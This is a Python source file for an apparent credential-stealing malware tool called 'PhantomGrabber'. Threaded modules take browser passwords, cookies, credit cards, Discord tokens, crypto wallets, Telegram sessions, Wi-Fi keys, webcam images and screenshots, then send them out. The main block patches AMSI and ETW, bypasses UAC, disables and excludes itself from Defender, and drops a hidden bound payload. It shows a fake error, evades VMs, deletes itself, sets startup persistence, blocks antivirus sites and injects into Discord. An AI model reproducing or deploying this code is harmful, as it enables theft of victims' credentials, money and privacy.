import os
import sys
import time
import uuid
import shutil
import zlib
import tempfile
import subprocess
import threading
import logging


class PhantomGrabber:
    def __init__(self):
        self.TempDir = os.path.join(
            os.getenv('temp', tempfile.gettempdir()),
            'phantom_' + uuid.uuid4().hex[:8]
        )
        os.makedirs(self.TempDir, exist_ok=True)
        self.ArchivePath = os.path.join(
            os.getenv('temp', tempfile.gettempdir()),
            f'{os.getlogin()}_{uuid.uuid4().hex[:6]}.zip'
        )

        Logger.info('Starting data collection')
        self.collect()
        Logger.info('Starting exfiltration')
        Exfiltrator.run(self.TempDir)
        Logger.info('Cleaning up')
        self.cleanup()

    def _run_module(self, func, *args):
        """Wrapper to catch exceptions in threaded modules."""
        try:
            func(*args)
        except Exception as e:
            Logger.debug(f'Module {func.__qualname__} failed: {e}')

    def collect(self):
        threads: list[threading.Thread] = []

        module_map = {
            'CapturePasswords':      lambda: Browsers.run(self.TempDir),
            'CaptureCookies':        lambda: None,  # handled by Browsers.run
            'CaptureHistory':        lambda: None,  # handled by Browsers.run
            'CaptureAutofills':      lambda: None,  # handled by Browsers.run (Settings.CaptureAutofills gated)
            'CaptureCreditCards':    lambda: None,  # handled by Browsers.run (Settings.CaptureCreditCards gated)
            'CaptureDiscordTokens':  lambda: Discord.run(self.TempDir),
            'CaptureWallets':        lambda: Wallets.run(self.TempDir),
            'CaptureTelegram':       lambda: Telegram.run(self.TempDir),
            'CaptureWifiPasswords':  lambda: Wifi.run(self.TempDir),
            'CaptureGames':          lambda: Games.run(self.TempDir),
            'CaptureWebcam':         lambda: Webcam.run(self.TempDir),
            'CaptureScreenshot':     lambda: Screenshot.run(self.TempDir),
            'CaptureSystemInfo':     lambda: SystemInfo.run(self.TempDir),
            'CaptureCommonFiles':    lambda: CommonFiles.run(self.TempDir),
            'CaptureExif':           lambda: ExifStealer.run(self.TempDir),
        }

        # Deduplicate — Browsers.run covers passwords, cookies, and history
        browser_queued = False
        for setting_name, runner in module_map.items():
            try:
                enabled = getattr(Settings, setting_name, False)
            except AttributeError:
                enabled = False

            if not enabled:
                continue

            # Browsers.run handles passwords, cookies, history in one call
            if setting_name in ('CapturePasswords', 'CaptureCookies', 'CaptureHistory'):
                if not browser_queued:
                    browser_queued = True
                    t = threading.Thread(
                        target=self._run_module,
                        args=(Browsers.run, self.TempDir),
                        daemon=True
                    )
                    threads.append(t)
                continue

            t = threading.Thread(target=self._run_module, args=(runner,), daemon=True)
            threads.append(t)

        for t in threads:
            t.start()

        for t in threads:
            t.join(timeout=60)

        Logger.info(f'Collection complete. {len(threads)} module(s) executed.')

    def cleanup(self):
        try:
            shutil.rmtree(self.TempDir, ignore_errors=True)
        except Exception:
            pass
        try:
            if os.path.isfile(self.ArchivePath):
                os.remove(self.ArchivePath)
        except Exception:
            pass


if __name__ == '__main__' and os.name == 'nt':
    Logger.info('Process started')

    if Settings.HideConsole:
        Syscalls.HideConsole()

    # AMSI + ETW patching
    Syscalls.PatchAmsi()
    Syscalls.PatchEtw()

    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:  # exe mode
            if '--nouacbypass' not in sys.argv and Settings.UacBypass:
                Logger.info('Attempting UAC bypass')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('UAC bypass failed')
                    if not Utility.IsInStartup():
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and not Settings.UacBypass:
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)

    Logger.info('Creating mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex exists, exiting')
        os._exit(0)

    if Utility.GetSelf()[1]:
        Logger.info('Excluding from Defender')
        Utility.ExcludeFromDefender()

    Logger.info('Disabling Defender')
    Utility.DisableDefender()

    # Handle bound file
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()):
        bound_src = os.path.join(sys._MEIPASS, 'bound.blank') if hasattr(sys, '_MEIPASS') else ''
        if os.path.isfile(bound_src):
            try:
                bound_dst = os.path.join(os.getenv('temp', ''), 'bound.exe')
                if os.path.isfile(bound_dst):
                    os.remove(bound_dst)
                with open(bound_src, 'rb') as f:
                    content = f.read()
                decrypted = zlib.decompress(content[::-1])
                with open(bound_dst, 'wb') as f:
                    f.write(decrypted)
                Utility.ExcludeFromDefender(bound_dst)
                subprocess.Popen(
                    'start bound.exe', shell=True,
                    cwd=os.path.dirname(bound_dst),
                    creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
                )
            except Exception as e:
                Logger.error(e)

    # Fake error
    if Utility.GetSelf()[1] and Settings.FakeError[0] and not Utility.IsInStartup():
        try:
            title = Settings.FakeError[1][0]
            message = Settings.FakeError[1][1]
            icon = Settings.FakeError[1][2]
            cmd = (
                f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); '
                f'sh.Popup(\'{message}\', 0, \'{title}\', {icon}+16);close()"'
            )
            subprocess.Popen(
                cmd, shell=True,
                creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
            )
        except Exception as e:
            Logger.error(e)

    # VM/Sandbox check
    if not Settings.Vmprotect or not VmProtect.isVM():
        # Melt handling
        if Utility.GetSelf()[1]:
            if Settings.Melt and not Utility.IsInStartup():
                Utility.HideSelf()
        else:
            if Settings.Melt:
                Utility.DeleteSelf()

        # Startup + Scheduled Task persistence
        try:
            if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup():
                path = Utility.PutInStartup()
                if path:
                    Utility.ExcludeFromDefender(path)
                Utility.CreateScheduledTask()
        except Exception:
            Logger.error('Failed persistence setup')

        # Block AV sites
        if Settings.BlockAvSites:
            Utility.BlockAvSites()

        # Discord injection
        if Settings.DiscordInjection and Settings.Injection:
            Utility.InjectDiscord(Settings.Injection)

        # Main loop: wait for internet then run
        while True:
            try:
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet available, starting collection')
                    PhantomGrabber()
                    Logger.info('Collection complete')
                    break
                else:
                    Logger.info('No internet, retrying in 10s')
                    time.sleep(10)
            except KeyboardInterrupt:
                os._exit(1)
            except Exception as e:
                Logger.critical(e, exc_info=True)
                Logger.info('Error occurred, retrying in 10 minutes')
                time.sleep(600)

        # Final melt
        if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup():
            Utility.DeleteSelf()

        Logger.info('Process ended')
